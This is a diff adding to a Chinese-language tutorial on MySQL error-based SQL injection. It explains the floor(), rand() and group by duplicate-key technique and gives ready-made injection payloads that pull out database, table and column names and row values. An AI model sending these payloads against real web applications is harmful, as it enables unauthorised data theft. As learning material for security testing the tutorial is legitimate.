@@ -386,7 +386,25 @@ http://******?id=1' union select 1,group_concat(0x7e,字段，0x7e),3 from 数�
 
 ### <mark style="color:yellow;">①floor（）报错</mark>
 
+floor（）报错需要和group by，count（），rand（）一起作用才能成功。它的原理是外键名重复造成的报错。rand（）会多次计算，导致插入临时表时主键重复。一般我们用的rand（0），那么他就只会产生0到1的整数，并且是伪随机。所以其实产生的就是0110，主键重复报错前的concat（）中的sql语句或者函数被执行了，所以该语句报错被抛出的主键时sql语句或者函数执行后的结果。
 
+这么说可能还不能理解，没关系，我们会再详细的讲解。
+
+首先count（\*）和group by连用的时候，mysql会产生一个虚拟的key value表，比如：
+
+<figure><img src="../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>
+
+user表一共有三行数据
+
+<figure><img src="../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
+
+调用group by sex的时候，会到sex里面进行查询，如果一个结果是之前没有出现过的，就设置value为1，如果出现了第二次，就设置为2，第三次就设置为3，有个图详细写了。
+
+<figure><img src="../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>
+
+然后直接贴图大家自行查看吧。
+
+<figure><img src="../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 这个报错注入在mysql 8+的版本中不存在，我的版本是10所以这个问题根本就不存在。
@@ -397,23 +415,42 @@ http://******?id=1' union select 1,group_concat(0x7e,字段，0x7e),3 from 数�
 #### <mark style="color:purple;">（1）爆数据库</mark>
 
 ```sql
+id=1' union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)a from information_schema.schemata group by a #
+```
+
+可以不断地改变limit得到其他
+
+```sql
+id=1' union select 1,count(*),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)*2)a from information_schema.columns group by a#
+```
+
+或者我们可以写
+
+```sql
+select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));
+```
+
+#### <mark style="color:purple;">(2)爆表名</mark>
+
+```sql
+id=1' union select 1,count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema='数据库名' limit 3,1),0x7e,floor(rand(0)*2))a from information_schema.columns group by a--+
+```
+
+#### <mark style="color:purple;">(3)爆字段名</mark>
+
+```sql
+id=1' union select 1,count(*),concat(0x7e,(select column_name from information_schema.columns where table_name='表名' limit 5,1),0x7e,floor(rand(0)*2))a from information_schema.columns group by a--+
+```
+
+#### <mark style="color:purple;">(4)爆出数值</mark>
+
+```sql
+id =1' union select 1,count(),concat(0x7e,(select 字段名 from 表名 limit 2,1),0x7e,floor(rand(0)*2))a from information_schema.columns group by a--+
 ```
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
+### <mark style="color:yellow;">②extractvalue（）报错</mark>
 
 
 
